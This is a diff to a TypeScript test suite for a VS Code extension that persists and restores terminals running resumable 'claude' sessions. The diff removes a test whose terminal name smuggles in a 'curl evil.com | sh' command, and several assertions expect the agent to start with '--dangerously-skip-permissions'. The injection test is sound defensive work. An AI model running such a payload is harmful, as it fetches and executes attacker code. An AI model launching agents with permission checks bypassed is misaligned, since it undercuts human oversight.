@@ -52,7 +52,7 @@ describe("TerminalManager", () => {
       expect(fs.readdirSync(stateDir).filter((name) => /^state\.json.*\.tmp$/.test(name))).toEqual([]);
     });
 
-    it("does not persist terminals before session ID capture or rename", () => {
+    it("does not persist terminals before session ID capture", () => {
       const t1 = tm.createTerminal("unrenamed");
       const t2 = tm.createTerminal("also-unrenamed");
       tm.saveState();
@@ -60,20 +60,15 @@ describe("TerminalManager", () => {
       expect(state.terminals).toHaveLength(0);
     });
 
-    it("saves and loads renamed terminals", () => {
+    it("writes a renamed terminal without a session ID only to names.json", () => {
       const t1 = tm.createTerminal();
-      const t2 = tm.createTerminal();
       tm.renameTerminal(t1, "warroom");
-      tm.renameTerminal(t2, "alan");
       tm.saveState();
 
-      // Create a new manager to load from disk
-      const tm2 = new TerminalManager(stateDir, signalBaseDir, startDir, makeLog());
-      const state = tm2.loadState();
-      expect(state.terminals).toHaveLength(2);
-      expect(state.terminals[0]).toEqual({ name: "warroom", index: 0 });
-      expect(state.terminals[1]).toEqual({ name: "alan", index: 1 });
-      tm2.disposeAll();
+      expect(tm.loadState().terminals).toEqual([]);
+      expect(JSON.parse(fs.readFileSync(path.join(signalBaseDir, "names.json"), "utf8"))).toEqual({
+        "0": "warroom",
+      });
     });
 
     it("returns empty state when file missing", () => {
@@ -196,6 +191,8 @@ describe("TerminalManager", () => {
       const t2 = tm.createTerminal();
       tm.renameTerminal(t1, "first");
       tm.renameTerminal(t2, "second");
+      tm.adoptWithSessionId(t1, SID);
+      tm.adoptWithSessionId(t2, OTHER_SID);
       tm.saveState();
       // exitStatus.reason = User (default in mock)
       tm.handleTerminalClosed(t1);
@@ -224,6 +221,7 @@ describe("TerminalManager", () => {
       tm.registerEventHandlers({ subscriptions: [] } as unknown as import("vscode").ExtensionContext);
       const t = tm.createTerminal();
       tm.renameTerminal(t, "test");
+      tm.adoptWithSessionId(t, SID);
       tm.saveState();
       const before = fs.readFileSync(path.join(stateDir, "state.json"));
 
@@ -245,6 +243,7 @@ describe("TerminalManager", () => {
       tm.registerEventHandlers({ subscriptions: [] } as unknown as import("vscode").ExtensionContext);
       const t = tm.createTerminal();
       tm.renameTerminal(t, "test");
+      tm.adoptWithSessionId(t, SID);
       tm.saveState();
 
       _closeTerminal(t, TerminalExitReason.User);
@@ -331,6 +330,8 @@ describe("TerminalManager", () => {
       const t2 = tm.createTerminal();
       tm.renameTerminal(t1, "warroom");
       tm.renameTerminal(t2, "alan");
+      tm.adoptWithSessionId(t1, SID);
+      tm.adoptWithSessionId(t2, OTHER_SID);
       tm.saveState();
       tm.disposeAll();
 
@@ -347,6 +348,7 @@ describe("TerminalManager", () => {
     it("bakes the claude --resume command into zsh shellArgs", () => {
       const t = tm.createTerminal();
       tm.renameTerminal(t, "warroom");
+      tm.adoptWithSessionId(t, SID);
       tm.saveState();
       tm.disposeAll();
 
@@ -355,24 +357,9 @@ describe("TerminalManager", () => {
       const opts = (terminal as any).creationOptions;
       expect(opts.shellPath).toBe("/bin/zsh");
       expect(opts.shellArgs[0]).toBe("-lc");
-      expect(opts.shellArgs[1]).toContain("claude --dangerously-skip-permissions --resume 'warroom'");
+      expect(opts.shellArgs[1]).toContain(`claude --dangerously-skip-permissions --resume '${SID}'`);
       expect(opts.shellArgs[1]).toMatch(/; exec '\/bin\/zsh' -il$/);
 
-      tm2.disposeAll();
-    });
-
-    it("skips terminals with unsafe names on restore", () => {
-      const state = { version: 1, terminals: [
-        { name: "'; curl evil.com | sh; echo '", index: 0 },
-        { name: "valid-session", index: 1 },
-      ]};
-      fs.mkdirSync(stateDir, { recursive: true });
-      fs.writeFileSync(path.join(stateDir, "state.json"), JSON.stringify(state));
-
-      const tm2 = new TerminalManager(stateDir, signalBaseDir, startDir, makeLog());
-      const terminals = tm2.restoreTerminals();
-      expect(terminals).toHaveLength(1);
-      expect(tm2.getSavedName(1)).toBe("valid-session");
       tm2.disposeAll();
     });
 
@@ -381,6 +368,8 @@ describe("TerminalManager", () => {
       const t2 = tm.createTerminal();
       tm.renameTerminal(t1, "warroom");
       tm.renameTerminal(t2, "alan");
+      tm.adoptWithSessionId(t1, SID);
+      tm.adoptWithSessionId(t2, OTHER_SID);
       tm.saveState();
       tm.disposeAll();
 
@@ -407,6 +396,7 @@ describe("TerminalManager", () => {
     it("saveState uses stored session name over terminal.name", () => {
       const t = tm.createTerminal("Terminal 1");
       tm.renameTerminal(t, "warroom");
+      tm.adoptWithSessionId(t, SID);
       tm.saveState();
       const state = tm.loadState();
       expect(state.terminals[0].name).toBe("warroom");
@@ -499,9 +489,10 @@ describe("TerminalManager", () => {
       expect(resolved).toMatch(/-2$/);
     });
 
-    it("adopted terminal appears in saveState", () => {
+    it("captured adopted terminal appears in saveState", () => {
       const fakeTerminal = window.createTerminal({ name: "untracked" }) as any;
       tm.renameTerminal(fakeTerminal, "warroom");
+      tm.adoptWithSessionId(fakeTerminal, SID);
       tm.saveState();
       const state = tm.loadState();
       expect(state.terminals).toHaveLength(1);
@@ -521,6 +512,7 @@ describe("TerminalManager", () => {
         [...(tm as any).terminalToIndex.keys()][0],
         "warroom",
       );
+      tm.adoptWithSessionId([...(tm as any).terminalToIndex.keys()][0], SID);
       tm.saveState();
       tm.disposeAll();
 
